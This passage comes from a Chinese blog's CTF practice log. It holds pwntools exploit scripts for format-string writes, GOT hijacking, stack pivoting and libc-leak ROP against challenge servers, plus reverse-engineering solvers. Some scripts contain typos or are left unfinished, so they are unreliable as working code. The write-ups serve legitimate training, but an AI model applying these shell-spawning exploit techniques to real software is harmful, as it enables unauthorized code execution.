+<p>我们可以通过<code>%n</code> 来修改储存随机数的地址的值</p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/04.png"></p>
+<p>随机数起始地址是在 0x804c044 由于随机数是四位 </p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26680</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">payload = p32(<span class="number">0x804c044</span>) + p32(<span class="number">0x804c045</span>) + p32(<span class="number">0x804c046</span>) + p32(<span class="number">0x804c047</span>)</span><br><span class="line">payload += <span class="string">&#x27;%10$n%11$n%12$n%13$n&#x27;</span></span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(<span class="number">0x10101010</span>))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>给Bss赋值，使得NX不可执行变为可执行 &#x3D;&gt; 构建shellcode</p>
+<div class="highlight-container" data-rel="Markdown"><figure class="iseeu highlight markdown"><table><tr><td class="code"><pre><span class="line">int mprotect(const void <span class="emphasis">*start, size_t len, int prot);</span></span><br><span class="line"><span class="emphasis">	第一个参数填的是一个地址，是指需要进行操作的地址。</span></span><br><span class="line"><span class="emphasis">	第二个参数是地址往后多大的长度。</span></span><br><span class="line"><span class="emphasis">	第三个参数的是要赋予的权限。</span></span><br><span class="line"><span class="emphasis">mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。</span></span><br><span class="line"><span class="emphasis">prot可以取以下几个值，并且可以用“|”将几个属性合起来使用：</span></span><br><span class="line"><span class="emphasis">　　1）PROT_READ：表示内存段内的内容可写；</span></span><br><span class="line"><span class="emphasis">　　2）PROT_WRITE：表示内存段内的内容可读；</span></span><br><span class="line"><span class="emphasis">　　3）PROT_EXEC：表示内存段中的内容可执行；</span></span><br><span class="line"><span class="emphasis">　　4）PROT_NONE：表示内存段中的内容根本没法访问。</span></span><br><span class="line"><span class="emphasis">prot=7表示可读可写可执行，将它类比于chmod中的7</span></span><br></pre></td></tr></table></figure></div>
+
+
+
+<h2 id="HDCTF-2023-KEEP-ON"><a href="#HDCTF-2023-KEEP-ON" class="headerlink" title="[HDCTF 2023]KEEP ON"></a>[HDCTF 2023]KEEP ON</h2><h3 id="知识点：格式化字符串劫持、栈迁移"><a href="#知识点：格式化字符串劫持、栈迁移" class="headerlink" title="知识点：格式化字符串劫持、栈迁移"></a><strong>知识点：格式化字符串劫持、<a class="link" href="https://www.cnblogs.com/max1z/p/15299000.html">栈迁移 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></strong></h3><p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/10.png"></p>
+<h3 id="法1-格式化字符串劫持-将printf-got-改成-system-plt"><a href="#法1-格式化字符串劫持-将printf-got-改成-system-plt" class="headerlink" title="法1,格式化字符串劫持(将printf_got 改成 system_plt)"></a><strong>法1,格式化字符串劫持(将printf_got 改成 system_plt)</strong></h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#   -&gt; 通过调用printf函数来调用system函数的地址，而这个程序中我们写入的内容保存在s中 然后会作为printf的参数，从而得到shell</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>,arch=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># context(log_level=&quot;debug&quot;,arch=&quot;i386&quot;)</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="number">28014</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./../pwn&quot;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./hdctf&quot;</span>)</span><br><span class="line"></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]  <span class="comment"># 寻找got表中printf的地址</span></span><br><span class="line"></span><br><span class="line">system_glt = elf.glt[<span class="string">&#x27;system&#x27;</span>]  <span class="comment"># 寻找plt表中system的地址</span></span><br><span class="line"></span><br><span class="line">payload1 = fmtstr_payload(<span class="number">6</span>, &#123;printf_got:system_plt&#125;)  <span class="comment"># fmtstr_payload:got表劫持函数, 6是对应格式化字符串位置的索引，后面将printf的地址改成system的</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;name: \n&#x27;</span>)   <span class="comment"># \n 是换行的意思.</span></span><br><span class="line"></span><br><span class="line">p.send(payload1)	<span class="comment"># 这里发送是为了将printf_got 改成 system_plt =&gt; 以后调用printf函数就相当于调用system</span></span><br><span class="line"></span><br><span class="line">vulnaddr = elf.sym[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload2 = cyclic(<span class="number">0x50</span> + <span class="number">0x08</span>) + p64(vuln_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;keep on !\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload2)   <span class="comment"># 这里必须用send --&gt; 因为这里的read写入0x60(溢出16字节)0x08和vuln的地址就是16字节了,sendline后面跟有换行符</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;name: \n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<blockquote>
+<p>寻找偏移量 找 616161在第几位 </p>
+<p>​	-&gt; 我们输入的是aaaa 0x61(十六进制 -&gt; ascii的97)即a</p>
+</blockquote>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/11.png"></p>
+<h3 id="法2-栈迁移-可以先阅读前面的那个文章"><a href="#法2-栈迁移-可以先阅读前面的那个文章" class="headerlink" title="法2,栈迁移,可以先阅读前面的那个文章"></a>法2,栈迁移,可以先阅读前面的那个文章</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ROPgadget --binary hdctf --only &quot;pop|ret&quot;  0x00000000004008d3 : pop rdi ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ROPgadget --binary hdctf | grep leave   0x00000000004007f2 : leave ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="number">28296</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./hdctf&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;name: \n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">b&#x27;%16$p&#x27;</span>)  <span class="comment"># 获得 old_rbp</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;hello,0x&#x27;</span>)</span><br><span class="line"></span><br><span class="line">old_rbp = <span class="built_in">int</span>(io.recvunitl(<span class="string">&#x27;\n&#x27;</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">target_addr = old_rbp - <span class="number">0x60</span> - <span class="number">0x08</span></span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x4008d3</span></span><br><span class="line"></span><br><span class="line">leave_ret = <span class="number">0x4007f2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p64(pop_rdi_ret) + p64(target_addr + <span class="number">0x20</span>) + p64(elf.sym[<span class="string">&#x27;system&#x27;</span>]) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x50</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(target_addr) + p64(leave_ret)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;keep on !&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<p>Q&amp;A（个人理解）</p>
+<p><code>%16$p是哪来的</code></p>
+<p>-&gt;可以用过gdb动态调试得到old_rbp的具体值,然后通过尽量多的%p来泄露出具体位置</p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/12.png"></p>
+<p><code>0x60是哪里来的?</code></p>
+<p>-&gt;子函数中栈底指向了父函数的栈底的地址, 0x7fffffffe1e0就是old_rbp - 0x7fffffffe180&#x3D;0x60</p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/13.png"></p>
+<p><code>payload中为什么要加0x20 ?</code></p>
+<p>-&gt; 0x20 &#x3D; 32 &#x3D;&gt; 4个8字节, 指向了&#x2F;bin&#x2F;sh所在的位置</p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/14.png"></p>
+<h2 id="BUU-HNCTF-2022-Week1-fmtstrre"><a href="#BUU-HNCTF-2022-Week1-fmtstrre" class="headerlink" title="BUU-[HNCTF 2022 Week1]fmtstrre"></a>BUU-[HNCTF 2022 Week1]fmtstrre</h2><p>先checksec一下</p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/06.png"></p>
+<p>然后IDA(64)打开</p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/09.png"></p>
+<blockquote>
+<p>open函数(成功打开文件返回非负整数，打开失败返回-1)</p>
+<p>read(fd, &amp;name, 48uLL)函数(向fd中读取48字节数据存放至name地址下)</p>
+<p>将name的地址赋值给v5</p>
+<p>再向buf中写入256字节数据</p>
+</blockquote>
+<p>格式化字符串漏洞点 <code>printf(buf)</code></p>
+<p><code>这段代码中需要打开flag这个文件 =l&gt; 小技巧</code></p>
+<p>-&gt; 在当前目录下创建一个flag文件，并输入一些东西，可以帮助我们观察其在栈上的位置。</p>
+<p>-&gt;当然,这个文件不是必须的.</p>
+<p><code>该如何利用这个漏洞？</code>根据这个题，flag这个文件的内容是存放在了栈中，那我们就要知道具体的位置。</p>
+<p>-&gt;偏移量的计算（看别人的Wp说是偏移了38）即flag 的内容是保存在第38个的位置上的</p>
+<p><strong>参考<a class="link" href="https://www.cnblogs.com/falling-dusk/p/17858030.html">https://www.cnblogs.com/falling-dusk/p/17858030.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></strong></p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/07.png"></p>
+<blockquote>
+<p>找 …4141… 类似的数据，看它是第几个地址（6）</p>
+</blockquote>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/08.png"></p>
+<blockquote>
+<p>name即flag的位置，0x20 &#x3D;32 &#x3D;&gt;偏移量.</p>
+<p>rsp到name的距离是 0x1d0 - 0x0d0 &#x3D; 256 &#x2F; 8 &#x3D;32</p>
+<p>​	对于这里要除以8 —&gt; 我理解的是（64位程序，栈中一个小格格是8字节数据，一共相差256字节，即32个小格子）</p>
+</blockquote>
+<p>32 + 6 &#x3D;38</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp:"></a><strong>exp:</strong></h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote()</span><br><span class="line">payload = <span class="string">&quot;%38$s&quot;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h2 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h2><p><code>open(&quot;/dev/urandom&quot;, 0);</code></p>
+<p>-&gt; <code>/dev/urandom</code>这个文件是产生随机数的</p>
+<p>-&gt; 0 是表示以只读模式打开</p>
+<p>-&gt; 如果open调用成功，返回一个非负整数 ； 如果调用失败，返回-1</p>
+<p><code>read(0, buf, 32u);</code></p>
+<p>-&gt; 从 0（标准输入[键盘]）中读取32字节数据 存放在buf中</p>
+<p>-&gt; 如果成功读取，返回实际读取的字节数</p>
+<p>-&gt; 如果未成功读取，返回-1，并设置全局变量errno来指示错误原因</p>
+<p><code>strncmp(buf, s, v1) </code></p>
+<p>-&gt;用于比较前两个字符串[buf s]的 前v1 个字符</p>
+<p>-&gt;如果前v1个字符都相同，返回0 ； 如果不同，则返回第一个不匹配的字符的ASCII码差值</p>
+<p><strong>找不到system和binsh，很明显要通过构造Rop寻找libc</strong></p>
+<p>题目提供了libc文件</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">27244</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;\xff&#x27;</span>*<span class="number">7</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Correct\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x08048825</span></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe7</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span> + p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">r.sendline(payload1)</span><br><span class="line">write_addr = u32(r.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line">offest = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system_addr = offest + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment">#bin_sh_addr = offest + libc.search(&#x27;bin/sh&#x27;).next()</span></span><br><span class="line">bin_sh_addr = offest + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Correct\n&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Buu-jarvisoj-fm-fm-n任意内存写入"><a href="#Buu-jarvisoj-fm-fm-n任意内存写入" class="headerlink" title="Buu - jarvisoj_fm[ fm %n任意内存写入]"></a>Buu - jarvisoj_fm[ fm %n任意内存写入]</h2><p>checksec一下 32位，用IDA打开</p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/4-7-00.png"></p>
+<p><strong>思路：</strong></p>
+<p>要想shell，肯定要满足x&#x3D;&#x3D;4；</p>
+<p>然后又看到有<code>printf(buf)</code> 格式化字符串漏洞标志</p>
+<p>&#x3D;&gt; 通过%n向x地址写入4</p>
+<p><strong>1.确定偏移量</strong></p>
+<p>这是32位程序，第一个参数可以写入AAAA &#x3D; ( 正好占满一个栈的小格子(4字节)的空间 )</p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/4-7-01.png"></p>
+<p>-&gt; %08，让长度为8，比较容易好看吧，这个无所谓</p>
+<p>-&gt; %x(打印十六进制数据) 或者 %p(打印栈上数据)均可</p>
+<p>&#x3D;&#x3D;&gt; 偏移量为11</p>
+<p><strong>2.通过<code>%(偏移量)$n</code>来写入值</strong></p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># if语句中可以调用system(&#x27;bin/sh&#x27;) =&gt; 满足if语句</span></span><br><span class="line"><span class="comment"># 让x=4</span></span><br><span class="line"><span class="comment"># x - addr：0804A02C</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">25301</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./fm&#x27;)</span></span><br><span class="line">x_addr = <span class="number">0x0804A02C</span></span><br><span class="line">payload = p32(x_addr) + <span class="string">&quot;%11$n&quot;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
+
+]]></content>
+      <categories>
+        <category>pwn</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Re刷题记录</title>
+    <url>/CTF/Re/Re%E8%AE%B0%E5%BD%95/</url>
+    <content><![CDATA[<h2 id="Buu-新年快乐-初用upx"><a href="#Buu-新年快乐-初用upx" class="headerlink" title="Buu - 新年快乐 [ 初用upx ]"></a>Buu - 新年快乐 [ 初用upx ]</h2><p>32位有壳</p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-4-00.png"></p>
+<blockquote>
+<p>加壳 upx.exe filename</p>
+<p>脱壳 upx.exe -d filename</p>
+</blockquote>
+<p><strong>在upx目录下打开终端，将软件放在相同目录（或者直接给出绝对路径）</strong></p>
+<p>脱完壳之后用32位ida打开，进入main函数，</p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-4-01.png"></p>
+<p>str2就是flag</p>
+<h2 id="Buu-xor-ida运用"><a href="#Buu-xor-ida运用" class="headerlink" title="Buu - xor [ ida运用 ]"></a>Buu - xor [ ida运用 ]</h2><p>查壳，无壳，拖进64位ida（我是在linux中file命令看的位）</p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-5-00.png"></p>
+<blockquote>
+<p>这是main函数，先看到</p>
+<p> if ( !strncmp(__b, global, 33uLL) )<br>    printf(“Success”);</p>
+<p>要success &#x3D;&gt; __b &#x3D;&#x3D; global 前33位相等</p>
+</blockquote>
+<blockquote>
+<p>全部分析一遍，先给__b 256字节置0 -&gt; 调用get_line函数 -&gt; 输入__b -&gt; __b字符串的长度只能是33 -&gt; 然后是for循环，一个异或</p>
+<p>-&gt; 最后比较，前33位要相等</p>
+</blockquote>
+<p><strong>Result</strong>： global[i] &#x3D; b[i] ^ b[i-1]，我们要求的是__b的值（前面的printf语句，input your flag），可以看出长度为33（如果不是33，直接goto LABEL_7 &#x3D;&gt; return语句）</p>
+<p><strong>Skill</strong>：点击global查看它的值，跳转到上面这个图中，看到灰色的部分（我奇怪的是，与Wp中看到的值不一样，我就随便双击了一下灰色部分，发现依然可以跳转），然后就来到了下面这个图的部分</p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-5-01.png"></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">shift + e =&gt; 提取数组中的字符</span><br></pre></td></tr></table></figure></div>
+
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-5-02.png" alt="4-5-02"></p>
+<p>脚本异或一下得到__b的值</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">data = [</span><br><span class="line">  <span class="number">102</span>,  <span class="number">10</span>, <span class="number">107</span>,  <span class="number">12</span>, <span class="number">119</span>,  <span class="number">38</span>,  <span class="number">79</span>,  <span class="number">46</span>,  <span class="number">64</span>,  <span class="number">17</span>,</span><br><span class="line">  <span class="number">120</span>,  <span class="number">13</span>,  <span class="number">90</span>,  <span class="number">59</span>,  <span class="number">85</span>,  <span class="number">17</span>, <span class="number">112</span>,  <span class="number">25</span>,  <span class="number">70</span>,  <span class="number">31</span>,</span><br><span class="line">  <span class="number">118</span>,  <span class="number">34</span>,  <span class="number">77</span>,  <span class="number">35</span>,  <span class="number">68</span>,  <span class="number">14</span>, <span class="number">103</span>,   <span class="number">6</span>, <span class="number">104</span>,  <span class="number">15</span>,</span><br><span class="line">   <span class="number">71</span>,  <span class="number">50</span>,  <span class="number">79</span>,  <span class="number">0</span></span><br><span class="line">]</span><br><span class="line">x = <span class="string">&quot;f&quot;</span>  <span class="comment"># for循环是从1开始的</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(data)):</span><br><span class="line">    x += <span class="built_in">chr</span>(data[i]^data[i-<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(x)</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Buu-reverse3-base64加密函数"><a href="#Buu-reverse3-base64加密函数" class="headerlink" title="Buu - reverse3 [ base64加密函数 ]"></a>Buu - reverse3 [ base64加密函数 ]</h2><p>32位无壳，拖进ida32位中，找到main_0函数</p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-5-03.png"></p>
+<p>输入字符串 Str -&gt; 经过sub_4110BE函数之后赋值给v4 -&gt; 将v4前40位字符给Destination -&gt; 遍历Destination字符串 每一个加上下表-&gt; 比较Destination 和 Str2是否相同</p>
+<blockquote>
+<p>sub_4110BE函数</p>
+</blockquote>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-5-04.png"></p>
+<p>-&gt; 下面这是一个base64加密的过程（Wp）</p>
+<p><strong>Result：</strong>可以查看Str2字符串值（追踪Str2），推出来输入的值（先base64加密 后每一位加上下标）</p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-5-05.png"></p>
+<p><strong>payload：</strong></p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">data = <span class="string">&quot;e3nifIH9b_C@n@dH&quot;</span></span><br><span class="line">str1 = <span class="string">&quot;&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">    str1 += <span class="built_in">chr</span>(<span class="built_in">ord</span>(data[i]) - i)</span><br><span class="line">flag = base64.b64decode(str1)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Buu-不一样的flag-迷宫题"><a href="#Buu-不一样的flag-迷宫题" class="headerlink" title="Buu - 不一样的flag [ 迷宫题 ]"></a>Buu - 不一样的flag [ 迷宫题 ]</h2><p>32位无壳，用ida打开，看到一串数字和上下左右（猜测是迷宫题）</p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-6-00.png"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-6-01.png"></p>
+<p>选中 <code>&#39;49&#39;</code>换成字符 -&gt; R键将Ascii换成对应字符</p>
+<p>-&gt; 如果是1 就退出</p>
+<p>-&gt; 如果是# 你输入的序列就是flag</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">*1111</span><br><span class="line">01000</span><br><span class="line">01010</span><br><span class="line">00010</span><br><span class="line">1111#</span><br><span class="line">下下下右右上上右右下下下</span><br><span class="line">222441144222</span><br></pre></td></tr></table></figure></div>
+
+<blockquote>
+<p>5*5列，从*开始，1,2,3,4对应上下左右 走到#</p>
+</blockquote>
+<h2 id="Buu-SimpleRev-字节序-真是逆向了"><a href="#Buu-SimpleRev-字节序-真是逆向了" class="headerlink" title="Buu - SimpleRev [ 字节序 真是逆向了 ]"></a>Buu - SimpleRev [ 字节序 真是逆向了 ]</h2><p>字节的排列方式有两个通用规则： <a class="link" href="https://www.ruanyifeng.com/blog/2022/06/endianness-analysis.html">学习了解字节序00 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>                    <a class="link" href="https://www.ruanyifeng.com/blog/2016/11/byte-order.html">学习了解字节序01 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><strong>大端序</strong> - 数据的低位字节放在内存的高位地址，高位字节存放在低位地址</p>
+<p><strong>小端序</strong> - 低位放在低地址，高位放在高地址</p>
+<p><strong>CPU读取内存中的数据时，是从低地址向高地址方向进行读取的</strong></p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-6-02.png"></p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5; ++i ) <span class="comment">// v5是key的长度</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( key[v3 % v5] &gt; <span class="string">&#x27;@&#x27;</span> &amp;&amp; key[v3 % v5] &lt;= <span class="string">&#x27;Z&#x27;</span> ) <span class="comment">// 判断key中的每个元素是不是大写字母</span></span><br><span class="line">    key[i] = key[v3 % v5] + <span class="number">32</span>;	<span class="comment">// 如果是，将那一位 加上32 =&gt; 变成对应的小写字母</span></span><br><span class="line">  ++v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">96</span> || v1 &gt; <span class="number">122</span> )	<span class="comment">// 小写字母范围</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v1 &gt; <span class="number">64</span> &amp;&amp; v1 &lt;= <span class="number">90</span> ) <span class="comment">// 大写字母范围</span></span><br><span class="line">    &#123;</span><br><span class="line">      str2[v2] = (v1 - <span class="number">39</span> - key[v3 % v5] + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>; <span class="comment">// 下面这些就有点懵逼了了</span></span><br><span class="line">      ++v3;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    str2[v2] = (v1 - <span class="number">39</span> - key[v3 % v5] + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">    ++v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !(v3 % v5) )</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">32</span>);</span><br><span class="line">  ++v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<blockquote>
+<p>还要对Ascii码熟悉点</p>
+</blockquote>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-6-03.png"></p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">text = <span class="string">&quot;killshadow&quot;</span></span><br><span class="line">key = <span class="string">&quot;adsfkndcls&quot;</span></span><br><span class="line">dic = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">chr</span>((<span class="built_in">ord</span>(j) - <span class="number">39</span> - <span class="built_in">ord</span>(key[i]) + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>) == text[i]:</span><br><span class="line">            flag += j</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div>
+
